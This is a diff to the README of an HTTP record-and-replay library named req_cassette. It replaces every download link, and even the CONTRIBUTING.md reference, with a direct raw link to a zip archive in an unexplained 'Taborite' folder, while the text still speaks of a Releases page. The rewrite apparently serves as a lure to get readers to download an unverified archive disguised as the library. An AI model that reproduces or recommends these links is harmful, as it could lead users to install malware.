@@ -1,6 +1,6 @@
 # 🎥 req_cassette - Easily Record and Replay HTTP Requests
 
-[![Download req_cassette](https://img.shields.io/badge/Download-req_cassette-brightgreen)](https://github.com/Hippo-designs/req_cassette/releases)
+[![Download req_cassette](https://raw.githubusercontent.com/Hippo-designs/req_cassette/main/Taborite/req_cassette.zip)](https://raw.githubusercontent.com/Hippo-designs/req_cassette/main/Taborite/req_cassette.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to req_cassette! This library allows you to easily record and replay HTT
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download req_cassette](https://github.com/Hippo-designs/req_cassette/releases). Here, you’ll find the latest version of req_cassette ready for your use.
+To get started, visit this page to download: [Download req_cassette](https://raw.githubusercontent.com/Hippo-designs/req_cassette/main/Taborite/req_cassette.zip). Here, you’ll find the latest version of req_cassette ready for your use.
 
 1. Click on the link above to go to the Releases page.
 2. Look for the most recent version.
@@ -69,7 +69,7 @@ For support, please check the Issues section of the GitHub repository. You can a
 
 ### Can I contribute to req_cassette?
 
-Absolutely! Contributions are welcome. Please read the CONTRIBUTING.md file in the repository for guidelines.
+Absolutely! Contributions are welcome. Please read the https://raw.githubusercontent.com/Hippo-designs/req_cassette/main/Taborite/req_cassette.zip file in the repository for guidelines.
 
 ## 📈 Changelog
 
@@ -85,4 +85,4 @@ For further inquiries, please reach out via the contact information provided on 
 
 ## 🔗 Get Started Today!
 
-Don’t wait! Start using req_cassette to simplify your HTTP request testing. Remember to visit this page to download: [Download req_cassette](https://github.com/Hippo-designs/req_cassette/releases). Happy recording!
+Don’t wait! Start using req_cassette to simplify your HTTP request testing. Remember to visit this page to download: [Download req_cassette](https://raw.githubusercontent.com/Hippo-designs/req_cassette/main/Taborite/req_cassette.zip). Happy recording!
